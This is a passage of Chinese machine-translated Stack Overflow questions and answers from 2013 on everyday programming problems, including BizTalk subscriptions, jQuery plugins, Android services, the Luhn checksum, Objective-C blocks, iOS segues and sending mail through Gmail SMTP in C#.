现在，这非常麻烦，这就是 javascript 库发挥作用的地方。我会推荐[D3.js](http://d3js.org)，因为它适用于 SVG。使用 D3，等效代码为：

```
d3.selectAll(".oldclass").style("stroke", "black");
d3.selectAll("path").attr("class", "newclass"); 
```

# biztalk - 如何订阅在 BizTalk 业务流程中创建的消息？

> ID：15555351
> 
> 赞同：0
> 
> 时间：2013-03-21T18:29:22.833
> 
> 标签：biztalk, biztalk-2010, biztalk-orchestrations

我有一个需要消息的编排。目标命名空间是“ [http://microsoft.com/HealthCare/HL7/2X](http://microsoft.com/HealthCare/HL7/2X) ”，根元素是“ORU_R01_23_GLO_DEF”

在编排中，我将消息映射到构造形状中的中间消息类型。目标命名空间是“ [http://mycompany.com/myapplication](http://mycompany.com/myapplication) ”，根元素是“MyMessage”。然后，“MyMessage”消息被进一步映射，然后使用编排中的逻辑发送端口发送到 Web 服务。然后将 WCF 发送端口绑定到编排，一切正常。一切都按预期工作。

在不改变编排的情况下，我想创建一个订阅中间“MyMessage”消息并将其写入文件的发送端口。为此，我创建了一个带有 BTS.MessageType = [http://mycompany.com/myapplication#MyMessage](http://mycompany.com/myapplication#MyMessage)过滤器的发送端口。

即使消息流经编排，我的发送端口也没有接收到消息。这是使用不正确的过滤器吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T10:55:28.077

您是否尝试订阅“MyMessage”消息，或发送到绑定到物理 WCF 发送端口的逻辑发送端口的同一消息？

您曾表示：

> 然后，“MyMessage”消息被进一步映射，然后使用编排中的逻辑发送端口发送到 Web 服务。然后将 WCF 发送端口绑定到编排，一切正常。

**消息未发布到 MsgBox**

根据您的描述，我建议您在“MyMessage”消息的编排中没有发送形状/逻辑发送端口组合，这就是为什么您不能在发送端口过滤器中手动订阅此消息类型的原因. 您没有提到“失败的路由报告”消息的事实进一步表明情况确实如此 - 当没有为要发布到 MsgBox 的消息找到订阅时，会生成此消息类型。

**捕获消息的“MessageType”**

但是，如果您需要捕获通过 WCF 发送端口发送的消息的副本，则需要确定*其*MessageType 并在将消息写入文件的第二个发送端口订阅中使用*它。*

如果您不确定要使用什么 MessageType，有一个简单的技巧可以确定此信息：

1.  停止（不是取消登记）WCF 发送端口
2.  像往常一样通过您的业务流程发送消息 - 该消息将在 WCF 发送端口上的 BizTalk 管理控制台中标记为“暂停可恢复”。
3.  在 BizTalk 管理控制台中打开消息并查看其“消息上下文”；在消息上下文中，您将看到它的“MessageType”属性，然后您可以使用它来了解要使用的订阅过滤器。
4.  启动 WCF 发送端口以刷新消息。

或者，如果您不想更改您的编排，您可以尝试在消息通过（原始）WCF 发送端口中的发送管道时归档您的消息 - 编写您自己的归档组件或使用[现有的商业组件](http://www.atomic-scope.com/download-trial/)。通过以这种方式使用归档组件，您将节省额外订阅和相关发送端口维护的费用。

**更新：**

听起来很像 OP 没有从他们的编排将中间消息发送到消息框（请参阅评论）。消息订阅仅在消息*发布*到消息框时才起作用 - 在这种情况下，有问题的消息（“消息 B”）是仅存在于编排的上下文和生命周期内的中间消息。OP 需要将消息发送到编排内的直接绑定端口，以允许通过发送端口订阅消息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-18T14:01:10.647

验证发送端口的管道。应该通过 XML，而不是通过。

# javascript - javascript中的Chosen.js多个选择值

> ID：15555359
> 
> 赞同：3
> 
> 时间：2013-03-21T18:29:56.370
> 
> 标签：javascript, jquery, jquery-chosen

我正在使用 selected.js 创建多项选择，但我没有在 php 中处理表单，而是尝试使用 javascript 来解析值。我的问题是我无法弄清楚如何从多项选择中检索值。

我使用以下方法创建选择：

```
<select data-placeholder="Select a category..." name="categories[]" multiple style="width: 350px" class="chzn-select"> 
```

并尝试使用这些 javascript 调用获取选定的值：

```
$('.chzn-select').chosen().val(); 
```

返回空

和

```
$('.chzn-select').chosen().val(0); 
```

返回

`{"0":{"jQuery19109988393174677814":730},"length":1,"prevObject":{"0": {"jQuery19109988393174677814":1,"location":{}},"context":{"jQuery19109988393174677814":1,"location":{}},"length":1},"context":{"jQuery19109988393174677814":1,"location":{}},"selector":".chzn-select"}`

使用`JSON.stringify()`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T21:33:48.067

你混合使用`chosen()`和`val()`。

前者将您`select`转换为一个不错的多选列表，而后者为您获取所选元素的值。

因此，您的 JavaScript 代码将是：

```
// Transforms your select element
$(".chzn-select").chosen();

// Gets the selected value(s)
$(".chzn-select").val(); 
```

该`val()`方法将返回[一个包含每个选定选项的数组](http://api.jquery.com/val/)。

我快速创建了一个[jsFiddle](http://jsfiddle.net/PRCyq/)来向您展示如何使用该插件：当您单击按钮时，您将在控制台中看到选定的值。

# java - 除了 ScheduledExecutorService，我还可以使用哪些其他“计时器”库？

> ID：15555360
> 
> 赞同：0
> 
> 时间：2013-03-21T18:29:56.960
> 
> 标签：java, timer

我有什么选择来做这件事？

创建多个计划任务是否需要多个线程？我只想使用一个线程来处理所有这些计划任务。

目前，我正在使用这个：

```
 // send first message, first message is right away
sendMessage();

// prepare the timer to send second message, 2nd message sends 35 seconds after 1st
final ScheduledFuture<?> future2 = ses.scheduleAtFixedRate(
    sendMessage(),
    initDelay,
    EXE_LENGTH * EXE_LENGTH,
    TimeUnit.SECONDS
);

// kill the process for future2 30 seconds after 2nd message is sent
ses.schedule(new Runnable()
{
    @Override
    public void run()
    {
        future2.cancel(true);
    }
}, initDelay, TimeUnit.SECONDS);

// prepare the timer to send the third message, 3rd message sends 35 seconds after task for 2nd message is killed
final ScheduledFuture<?> future3 = ses.scheduleAtFixedRate(
    sendMessage(),
    initDelay + 2L,
    EXE_LENGTH * EXE_LENGTH,
    TimeUnit.SECONDS
);

// kill the process for future3 30 seconds after 3rd message is sent
ses.schedule(new Runnable()
{
    @Override
    public void run()
    {
        future3.cancel(true);       
    }
}, initDelay, TimeUnit.SECONDS);

// shutdown the whole scheduler after the 3rd process is killed
ses.schedule(new Runnable() 
{
    @Override
    public void run() {
        shutdown(challengeId);
    }
}, initDelay+2L, TimeUnit.SECONDS); 
```

我对线程不太了解，但我相信这会创建多个线程来处理一些任务。

# android - 如何让绑定服务知道对 stopService() 的任何调用（即使在绑定时）？

> ID：15555366
> 
> 赞同：1
> 
> 时间：2013-03-21T18:30:26.830
> 
> 标签：android, android-service

我看过很多关于停止绑定服务的帖子，但大多数只是对 Android API 的误解，没有人回答我的问题。我也没有在 Android Developers 网站上找到答案（我可能错过了一些东西）。

我有一个可以启动和绑定的服务。我知道`stopService()`如果客户仍然绑定到它，调用不会停止我的服务（因此`onDestroy()`不会被调用）。

但是，我想在`stopService()`被调用时在服务中做一些事情，即使这不会停止它（因为它的“启动”行为与其简单的“绑定到”行为略有不同）。

我知道即使服务已经启动，`onStartCommand()`只要调用它就会调用它，但只调用一次（当服务启动时）。`startService()``onCreate()`

我想要的是一个类似的回调`onStopCommand()`，它会在被调用时`stopService()`被调用，即使`onDestroy()`在仍然绑定的服务的情况下没有被调用，但是 AFAIK 这不存在，不是吗？

我考虑解决问题的选项如下，但我不喜欢其中任何一个：

1.  将我的服务拆分为 2 个服务（1 个已启动，1 个已绑定）
2.  在我的服务中实现一个`stop()`方法，我应该在之前的任何地方调用它`stopService()`（我可以通过活页夹来做到这一点）。

您如何看待这些解决方案？你有更好的主意吗？

**编辑：这是我的服务的“已启动”和“绑定到”行为之间的差异的更详细描述：**

让我们将我的服务称为 S1。它包含一个状态，可以通过绑定到它来从其他活动和服务访问。还有另一个服务，S2，只能绑定到。

通过 启动时`startService()`，S1 绑定到 S2 以侦听 S2 中可以更改 S1 中状态的事件。

当通过 停止时`stopService()`，我希望 S1 与 S2 解除绑定（并停止更新其状态）。现在我在`onDestroy()`.

我的问题是，如果客户端绑定到 S1，S1 不会停止，因此不会与 S2 解除绑定。

我希望它有助于理解我的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:36:50.183

> 这不存在，不是吗？

你是对的——它不存在。

> 这不存在，不是吗？

两者都应该工作。很难指出哪个可能更可取，因为我们对您的应用了解不多。

> 你有更好的主意吗？

只使用一种或另一种模式。很少有服务需要命令和绑定模式。

# php - Luhn算法问题

> ID：15555367
> 
> 赞同：0
> 
> 时间：2013-03-21T18:30:36.163
> 
> 标签：php, mysql, algorithm, luhn

我决定使用 Luhn 算法来验证一些瑞典的社会安全号码。通过自己编写函数，我得到了按计划工作，尽管存在一些问题。使用我的代码和我尝试过的其他代码，我发现它仍然可以验证简单的组合，例如 2222222222 和 4444444444 是有效的。

这两个例子很容易避免，但它让我想知道其余的组合是假的，但仍然通过使用算法验证为真。

是我，以及我看过的那些例子，是代码出了问题，还是算法的已知错误？如果是这样，我该如何解决，或者是否有其他更合适的方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:36:01.063

Luhn 算法并不意味着验证 SSN 号码是否有效。只是它的格式有效。它有助于捕获错误输入的数字，并使黑客/垃圾邮件发送者试图破坏您的系统变得更加困难。这并不意味着阻止输入错误的数字。

该算法也用于美国的信用卡号码。但是像 4111111111111111 这样的测试卡号就可以通过了。在您尝试付款之前捕获错误数字非常有帮助，即使您每次付款都会产生费用，即使它不成功。但要最终知道信用卡号是否合适，您需要实际收取费用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T18:38:00.713

从理论上讲，这些*都是*有效数字——Luhn 算法是对输入错误数字的人的校验和，而不是用于判断他们是否编造了这些数字。

例如，支付网关（英国）中使用的标准测试信用卡之一是 4444333322221111，它恰好是有效的 Visa 卡号。由于该卡未分配给任何人，因此尝试实际使用它付款会失败，但这与校验位无关，而与数字背后的含义有关。

# jsf - 为 里面

> ID：15555368
> 
> 赞同：3
> 
> 时间：2013-03-21T18:30:44.403
> 
> 标签：jsf, jsf-2, jstl

我想为`<div>`包含在`<c:forEach>`. 每当呈现页面时，`<div>`由 生成的所有 s`<c:forEach>`都具有相同的 id。有没有办法为生成的所有 div 分配唯一 ID `<c:forEach>`？我尝试过使用`<ui:repeat>`，但我遇到了问题，所以我决定坚持使用`<c:forEach>`.

小面：

```
<c:forEach var="p" items="#{statusBean.statusList}">
    <h:form>
        <div class="status">
            // Content
        </div>
    </h:form>
</c:forEach> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-21T18:39:02.780

使用该`c:forEach`属性`varStatus`定义将包含[循环状态的](http://docs.oracle.com/javaee/6/api/javax/servlet/jsp/jstl/core/LoopTagStatus.html)变量。然后你可以像这样在你的模板中使用它：

```
<c:forEach var="p" items="#{statusBean.statusList}" varStatus="loop">
        <h:form>
            <div class="status_#{loop.count}">
            // Content
            </div>
        </h:form>
</c:forEach> 
```

`#{loop.index}`如果您希望它以 0 启动，您也可以使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:38:19.073

尝试使用一个`<h:panelGroup>`或另一个 JSF 组件来呈现您的 div。

*   [http://docs.oracle.com/javaee/5/javaserverfaces/1.2/docs/tlddocs/](http://docs.oracle.com/javaee/5/javaserverfaces/1.2/docs/tlddocs/)

这将导致为您生成唯一 ID。

# jquery - “私人” jQuery 插件

> ID：15555370
> 
> 赞同：0
> 
> 时间：2013-03-21T18:30:49.337
> 
> 标签：jquery, jquery-plugins

我已经在互联网上搜索了这个问题的答案，但无济于事。我觉得答案可能很简单，但它一直在逃避我。

我正在编写一个 jQuery 插件，并遵循所有最佳实践。假设我的插件名为 foo，并且我有以下标准插件定义：

```
(function($){
  $.fn.foo = function() {
    this.append('<p>I'm doing stuff!</p>');
  }
})(jQuery); 
```

到目前为止非常基本。现在假设我有一些**内部**功能要封装在一个名为 bar 的函数中。不过，这里有一个问题：我想像 jQuery 插件一样调用它，这样我就可以利用链接等。也就是说，我希望能够像这样使用它：

```
(function($){
  /* this is bad: it clutters up the namespace, and exposes implementation details:
  $.fn.bar = function(text) {
    this.append('<p>'+text'</p>');
  }
  */
  $.fn.foo = function() {
    this.append('<p>I'm doing stuff!</p>').bar('bar does something else!');
  }
})(jQuery); 
```

如何声明 bar 以便我可以像 jQuery 插件一样调用它，但它在我的插件范围之外不可用？

我搞砸了使用 Javascript 的 apply 方法，我得到了一些可以工作的东西，但它很笨重，而且不比只使用 jQuery 对象作为参数调用函数更好。

我确定有一个简单的解决方案...有人吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T20:57:46.807

[Ethan，使用这里](http://docs.jquery.com/Plugins/Authoring)提倡的插件模式，存在一系列可能性，包括私有函数和一系列公共方法都在一个插件中。

您可以拥有私有函数，并且可以想象它们是可链接的（某种程度上），但是：

*   您通常不能在内部进行链接，因为内部调用往往使用`.call()`.
*   您通常不希望或需要内部可链接性，因为公共方法通常是 form `return this.each(function(){...});`，并且在此循环中，代码处理它所作用的 jQuery 选择的单个元素。

例如 ：

```
(function($){
    // **********************************
    // ***** Start: Private Members *****
    var pluginName = 'foo';
    var cough = function(text, bgColor) {
        text = text || ''; 
        bgColor = bgColor || '#FFF';
        $(this).append($('<p/>').append(text).css('backgroundColor', bgColor));
    };
    // ***** Fin: Private Members *****
    // ********************************

    // *********************************
    // ***** Start: Public Methods *****
    var methods = {
        init: function(text) {
            text = text || 'foo init!';
            return this.each(function() {
                methods.bar.call($(this), 'cough from bar from init');
                cough.call($(this), 'cough from init');
            });
        },
        bar: function(text) {
            text = text || 'cough from bar!';
            return this.each(function() {
                cough.call(this, text, '#99CC99');
            });
        }
    };
    // ***** Fin: Public Methods *****
    // *******************************

    // *****************************
    // ***** Start: Supervisor *****
    $.fn[pluginName] = function( method ) {
        if ( methods[method] ) {
            return methods[method].apply( this, Array.prototype.slice.call( arguments, 1 ));
        } else if ( typeof method === 'object' || !method ) {
            return methods.init.apply( this, arguments );
        } else {
            $.error( 'Method ' + method + ' does not exist in jQuery.' + pluginName );
        }
    };
    // ***** Fin: Supervisor *****
    // ***************************
})(jQuery); 
```

这里插件'foo'有一个公共方法'init'和'bar'，以及一个私有实用程序'cough'，它在内部由`init`'bar'和'bar'调用。

你可以打电话

```
$("div").foo(); //same as $("div").foo(init');
$("div").foo('bar', 'cough from bar'); 
```

但是`cough`不能被外部调用。

注意：在上面的模式中，主管总是完全相同的——不需要编辑。

# html - 我应该使用什么压缩方法来预压缩 html 快照？

> ID：15555371
> 
> 赞同：1
> 
> 时间：2013-03-21T18:30:58.383
> 
> 标签：html, apache

我有数百万个 html 文件，我的动态 web 应用程序的快照，用于服务于搜索引擎（整个 _escaped_fragment_ malarky - 生成这些快照需要 1.5 秒，所以我正在缓存它们）。我想预压缩这些文件并通过 Apache 提供它们（通过 PHP，如果不存在，它将生成一个新的快照）而不解压缩它们，然后让 mod_deflate 重新压缩它们。

我应该使用什么压缩方法来预压缩这些准备通过 php/Apache 推送的 html 快照？

# c# - 更改 c# 类库设置会破坏 reference.cs 工具生成的代码

> ID：15555374
> 
> 赞同：0
> 
> 时间：2013-03-21T18:31:07.170
> 
> 标签：c#, .net, visual-studio, class-library

好的，这有点像新手——我有一个类库项目。我在项目中添加了一个 Web 服务调用，后来我决定不需要它。因此，我转到解决方案资源管理器中的项目名称，右键单击，获取属性的 GUI，转到设置，右键单击 Web 服务的行并单击删除。干净整洁，对吧？没有。删除后，我进行了构建，现在项目无法编译。它抛出以下错误：

> 'Security.Properties.Settings' 不包含'Security_webtest_Service' 的定义，并且找不到接受'Security.Properties.Settings' 类型的第一个参数的扩展方法'Security_webtest_Service'（您是否缺少 using 指令或程序集引用?) C:\Security3\FOASecurity\Web References\webtest\Reference.cs 39

Refrence.cs 是一个工具生成的代码文件，有一个警告不要乱用它。知道我需要做什么才能让项目不再引用这个被删除的 Web 服务吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:37:11.447

您只是删除了参考的设置，而不是参考。在解决方案资源管理器中展开项目，然后在服务引用中删除该引用。有关详细信息，请参阅[http://msdn.microsoft.com/en-us/library/bb628652.aspx](http://msdn.microsoft.com/en-us/library/bb628652.aspx)

“Web Reference”基本相同。如果以上内容不明显，请参阅[http://msdn.microsoft.com/en-us/library/d9w023sx(v=vs.80).aspx了解有关 Web 参考的具体细节。](http://msdn.microsoft.com/en-us/library/d9w023sx(v=vs.80).aspx)

# xcode - 使用applescript cocoa objc在xcode中设置音量不起作用

> ID：15555380
> 
> 赞同：1
> 
> 时间：2013-03-21T18:31:22.630
> 
> 标签：xcode, cocoa, applescript-objc

我在 xcode 3.2 中有一个 applescript xcode 项目，并且正在尝试更改系统音量……但是它不起作用……它要么停止 nstimer，要么根本不做任何事情……

有没有办法记录错误以便我可以查明问题？

这是我的代码

```
set newVolume to 50
set volume output volume newVolume
textName's setStringValue_(currentVolume)
set currentVolume to newVolume 
```

obv 这是一个更简洁的版本，但这实际上不起作用......它在 NSTimer 内部，但是，即使不在 NSTimer 内部，它仍然不起作用...... newVolume、currentVolume 和 textName 都被声明了...... .我需要为设置音量线声明一些东西吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T18:59:45.650

因此，您的实际问题只是如何从 AppleScriptObjC 记录错误：

AppleScriptObjC 会将脚本中抛出的任何错误记录到控制台——只需查看 Xcode 的底部窗格即可。例如，在您的情况下，您应该看到类似“«script»不理解«aevtstvl»消息。” （这不是很清楚，但它告诉您您的脚本向脚本对象发送了一个`set volume`命令，该脚本对象没有处理程序。）如果您想自己捕获和记录错误，您可以将麻烦的部分放在里面一个`try`/`on error`块，并在错误处理程序中自己处理它。

如果您感到好奇，也可以打开`NSScriptingDebugLogLevel`偏好，如下所示：

```
defaults write com.me.myapp NSScriptingDebugLogLevel 1 
```

...并且 AppleScriptObjC 将记录有关通过网桥发送的每条消息的信息。（将其设置为 0 或使用`defaults delete`将其关闭。）

那是错误记录。现在，你实际上并没有问，但我还是要回答，“我该如何修复我的`set volume`命令？”</p>

简短版：添加`tell current application to`：

```
tell current application to set volume output volume 50 
```

是的，“新”音量参数的范围是 0 到 100。旧的兼容性参数从 0 到 7。（为什么？旧的控制面板音量滑块有 8 个档位。）

长版：

`set volume`默认直接参数和' 对其的处理之间存在不良交互。当使用 AppleScriptObjC 时，“它”，因此默认的直接参数，除非你另有说明，是当前脚本，并且`set volume`窒息。你可以通过说“它”来强迫“它”什么都不是`tell current application to`。（或者，您可以使用老式的形式给它一个明确的直接参数，`set volume x`其中`x`是从 0 到 7 的实数。但是，这与您从中获得的数字不匹配`get volume settings`，仅允许您设置输出音量，并且不允许您正确设置“静音”之类的东西。）

顺便说一句，如果你的 AppleScriptObjC 项目足够简单（特别是，如果你不需要任何接口），你可以直接在 AppleScript Editor 中编写它：选择 File > New from Template > Cocoa-AppleScript Applet，然后使用普通的 AppleScript`on run`和`on open`处理程序，除了您现在还可以从 Cocoa 调用任何内容。

# objective-c - 如何在我的块函数中引用当前块对象？

> ID：15555383
> 
> 赞同：1
> 
> 时间：2013-03-21T18:31:31.273
> 
> 标签：objective-c, objective-c-blocks

我知道块描述符在调用时会在堆栈上传递给块函数。是否有一个变量名可以用来在我的代码中引用它（例如方法`self`或`_cmd`方法）

```
(^{
    // how can I access the block descriptor here?
})(); 
```

**编辑**

我实际上想要块对象，而不是块描述符......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:42:06.733

简而言之，你不能。至少不是直接的（没有类似于`self`在块内的东西——我们对此进行了长时间的思考，但是根据以下模式无法提出既优雅又足够需要它的东西来证明添加这样的语法是合理的） .

如果要引用该块，则需要执行以下操作：

```
__block void(^strawberryFields)();
strawberryFields = ^{ strawberryFields(); };
strawberryFields(); 
```

请注意，以上将永远运行。另请注意，如果您计划稍后使用该块，您可能希望在分配时复制该块。

* * *

考虑：

```
 NSMutableArray *array = [NSMutableArray array];
 int i;
 for(i = 0; i<5; i++) {
    [array addObject:[^{ return i*i; } copy]];
 } 
```

你最终会得到一个包含 5 个块的数组，每个块捕获不同的 i 值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-23T17:11:23.907

创建一个方法来为您初始化每个块可能会有所帮助。这是一个快速测试，演示每个块都有自己的变量：

```
-(void (^)(void))intAddingBlock:(NSString *)name {
    __block int intForThisBlock = 0;
    return ^{
        NSLog(@"%@ before: %d", name, intForThisBlock);
        intForThisBlock += 5;
        NSLog(@"%@ after: %d", name, intForThisBlock);
    };
}

-(void)testTheBlock {
    void(^block1)(void) = [self intAddingBlock:@"block 1"];
    void(^block2)(void) = [self intAddingBlock:@"block 2"];

    block1();
    block1();
    block2();
    block1();
    block2();
} 
```

输出：

```
block 1 before: 0
block 1 after: 5
block 1 before: 5
block 1 after: 10
block 2 before: 0
block 2 after: 5
block 1 before: 10
block 1 after: 15
block 2 before: 5
block 2 after: 10 
```

# ios - 优先考虑 IBAction 而不是 segue

> ID：15555384
> 
> 赞同：3
> 
> 时间：2013-03-21T18:31:32.283
> 
> 标签：ios, objective-c, storyboard

我正在使用情节提要，在我的情节提要中，我有一个与另一个视图控制器连接的按钮。因此，当您单击按钮时，会显示另一个视图控制器。我使用 Action Segue - Push in the storyboard 连接了它。我还将按钮与 IBAction 属性连接起来。问题是当我单击按钮时，它首先转到其连接的视图控制器，然后执行 IBAction 函数。如何更改此订单？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:48:39.193

您无法更改该顺序。您可以做两件事。

第一：只使用segue。覆盖`prepareForSegue:`并将您的代码放在那里。如果该视图控制器有多个 segure，那么您可以区分`prepareForSegue:`当前正在执行哪一个。为此，您应该为他们提供唯一的名称/segue ID。

第二：仅使用 IBAction。在 IBAction 方法的最后，调用`performSegueWithIdentifier:sender:`. 同样，为此，您必须使用唯一的 segue ID 命名所有 segue。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T18:34:32.913

要问自己的问题是，为什么要同时使用两者？选择一个并坚持使用 IMO。

如果你想在 segue 发生时执行一些操作，你应该实现

[`prepareForSegue:`](http://developer.apple.com/library/ios/documentation/uikit/reference/UIViewController_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40006926-CH3-SW84)

**更新地址评论**

> 我实际上不知道如何在代码中做到这一点，如何在不使用 Action Segue Push 的情况下加载故事板上的 ViewController？

我发现的最简单的方法是在您的 Storyboard 中，您可以为视图控制器设置一个标识符。

![在此处输入图像描述](../Images/2c4f73d36f4e9d25fe65375cdfda1d9d.png)

注意**Storyboard ID**设置为 MyViewController

现在在您的 IBAction 方法中，您可以执行以下操作。

```
UIViewController *myViewController = [[UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil] instantiateViewControllerWithIdentifier:@"MyViewController"];
[self presentViewController:myViewController animated:YES completion:nil]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-14T16:06:03.690

我通过链接我的 segue 中的 IBAction 解决了这个问题。我发现这种方法最有用，因为我可以在没有 segue 的情况下进行“保存”操作（将按钮链接到 IBAction，有时很有用），并且在必要时还可以使用 segue 来关闭视图控制器。

```
-(IBAction)save:(id)sender
{
 /* Do some Save stuff */
} 
```

然后在我的 prepareForSegue:sender:

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    if ([[segue identifier] isEqualToString:@"save"])
    {
        [self save:sender];
    }
} 
```

将您的非 segue 按钮链接到 IBAction，并使用标识符“save”将您的展开或其他此类按钮连接起来。魔法。

# zend-framework2 - 如何部分访问自定义视图助手？

> ID：15555386
> 
> 赞同：0
> 
> 时间：2013-03-21T18:31:40.127
> 
> 标签：zend-framework2

有没有办法像这样访问在我的模块中注册的自定义视图助手：

```
'fooBar' => 'Library\FooBar\FooBar' 
```

像这样？

```
<p>This is partial...</p>
<p><?php echo $this->fooBar(); ?></p> 
```

我可以在视图中使用 fooBar 视图助手，但在部分视图中出现错误。这是我的视图助手：

```
class FooBar extends AbstractHelper
{

    public function __invoke($module)
    {
        return $this->getView()->myMethod();
    }

} 
```

而且我遇到了一个错误：

```
Call to a member function myMethod() on a non-object 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:56:55.550

它对我有用。我在 Module.php 文件中配置了类似这样的视图助手。

//module/src/module/View/Helper/Authz.php //查看助手

```
 use Zend\View\Helper\AbstractHelper;

    class Authz extends AbstractHelper 
    {

    public function isAllowed()
{
}
    } 
```

.

//模块.php

```
public function bootstrap(Event $e)
    {

    }
    public function onBootstrap($e)
    {

        $app = $e->getApplication();
        $serviceManager = $app->getServiceManager();

        $serviceManager->get('viewhelpermanager')->setFactory('Authz', function ($sm) use ($e)      {
           return new Authz($sm); //view helper
        });

    } 
```

// 部分 // 视图/布局/partials/leftnav.phtml

```
$userAllow = $this->Authz()->isAllowed(); 
```

// 在布局中，我在 leftnav.phtml 部分上方调用类似这样的内容。//查看/布局/layout.phtml

```
<?php echo $this->partial('partials/header', array('company_name' => 'CompanyName')); ?> 
```

// 配置/module.config.php

```
'view_manager' => array(
        'template_path_stack' => array(
            'modulename' => __DIR__ . '/../view' ,
        ),
        'strategies' => array(
            'ViewJsonStrategy',
        ),

        'display_not_found_reason' => true,
        'display_exceptions'       => true,
        'doctype'                  => 'HTML5',
        'not_found_template'       => 'error/404',
        'exception_template'       => 'error/index',
        'template_map' => array(
            'layout/layout'           => __DIR__ . '/../view/layout/layout.phtml',
            'partials/header'           => __DIR__ . '/../view/layout/partials/header.phtml',
            'partials/leftnav'           => __DIR__ . '/../view/layout/partials/leftnav.phtml',            
            'partials/contents-top'           => __DIR__ . '/../view/layout/partials/contents-top.phtml',            
            'error/404'               => __DIR__ . '/../view/error/404.phtml',
            'error/index'             => __DIR__ . '/../view/error/index.phtml',    
        ),

    ), 
```

# css - colozilla 梯度生成器

> ID：15555388
> 
> 赞同：1
> 
> 时间：2013-03-21T18:31:42.323
> 
> 标签：css, background, linear-gradients

我在 colorzilla 中生成了渐变背景，并将其放入 css 文件中，正如您在这段代码中看到的那样，它不断重复我的背景。我希望这个背景从它开始到页面结束。

```
body{
    background: #1d6fa4;
    background: -moz-linear-gradient(-45deg,  #1d6fa4 1%, #499bc8 26%, #51abc9 52%, #3e94c1 74%, #277cad 100%);
    background: -webkit-gradient(linear, left top, right bottom, color-stop(1%,#1d6fa4), color-stop(26%,#499bc8), color-stop(52%,#51abc9), color-stop(74%,#3e94c1), color-stop(100%,#277cad));
    background: -webkit-linear-gradient(-45deg,  #1d6fa4 1%,#499bc8 26%,#51abc9 52%,#3e94c1 74%,#277cad 100%);
    background: -o-linear-gradient(-45deg,  #1d6fa4 1%,#499bc8 26%,#51abc9 52%,#3e94c1 74%,#277cad 100%);
    background: -ms-linear-gradient(-45deg,  #1d6fa4 1%,#499bc8 26%,#51abc9 52%,#3e94c1 74%,#277cad 100%);
    background: linear-gradient(135deg,  #1d6fa4 1%,#499bc8 26%,#51abc9 52%,#3e94c1 74%,#277cad 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1d6fa4', endColorstr='#277cad',GradientType=1 );
} 
```

![重复背景](../Images/499973b2244caf7f955e665778c13c09.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T18:32:58.193

你需要这个

```
html, body {
   height: 100%;
}

body {
   background-position: fixed;
   /* Gradient dump goes here */
} 
```

# c# - 从 gmail SMTP C# 连接超时发送邮件

> ID：15555389
> 
> 赞同：11
> 
> 时间：2013-03-21T18:31:46.620
> 
> 标签：c#, web-config, smtp, gmail

我一直在尝试从 gmail 帐户通过 C# 发送电子邮件，以便为我的网站注册帐户。

我尝试了几种方法，但是仍然弹出相同的异常： System.Net.Mail.Smtp Exception - Connection has timed out。

这是我在我的 Web.config 文件中包含的内容：

```
<system.net>
    <mailSettings>
        <smtp deliveryMethod="Network" 
              from="Writely &lt;mrbk.writely@gmail.com&gt;">
            <network host="smtp.gmail.com" 
                     port="465" 
                     enableSsl="true" 
                     defaultCredentials="false" 
                     userName="mrbk.writely@gmail.com" 
                     password="******" />
        </smtp>
    </mailSettings>
</system.net> 
```

其中 writely 是我的网站名称，而 mrbk.writely@gmail.com 是我希望从中发送电子邮件的帐户。

然后在我的帐户控制器中，当我连接我的数据库并将用户保存在我的表中时，我正在创建我的 MailMessage 对象并尝试通过以下方式相同的邮件：

```
using (DBConnection conn = new DBConnection())
{
       conn.UserInfoes.Add(userInfo);
       conn.SaveChanges();

       MailMessage mail = new MailMessage();
       mail.From = new MailAddress("mrbk.writely@gmail.com");
       mail.To.Add("bernice.zerafa11@gmail.com");
       mail.Subject = "Welcome to Writely";
       mail.Body = "Test content";

       SmtpClient smtp = new SmtpClient();
       smtp.Send(mail);
} 
```

我错过了什么或做错了什么？我读到这是在堆栈溢出的其他一些问题中执行此操作的好方法，所以我真的不知道这里有什么问题。

谢谢你的帮助 ：）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-21T18:39:55.330

您需要告诉 SmtpClient 使用什么设置。它不会自动从 Web.Config 文件中读取此信息。

```
SmtpClient smtp = new SmtpClient("smtp.gmail.com", 465);
smtp.Credentials = new NetworkCredential("mrbk.writely@gmail.com", "***");
smtp.EnableSsl = true;
smtp.Send(mail); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-21T18:42:25.683

gmail 需要身份验证：

```
Outgoing Mail (SMTP) Server
requires TLS or SSL: smtp.gmail.com (use authentication)
Use Authentication: Yes
Port for TLS/STARTTLS: 587
Port for SSL: 465 
```

所以我所做的是

```
var client = new SmtpClient("smtp.gmail.com", 587)
        {
            Credentials = new NetworkCredential("mrbk.writely@gmail.com", "mypwd"),
            EnableSsl = true
        };
        client.Send("bernice.zerafa11@gmail.com", "bernice.zerafa11@gmail.com", "Welcome to Writely", "Test content"); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-28T08:00:50.543

我遇到了完全相同的问题，将端口号从 465 切换到 587 后解决了。

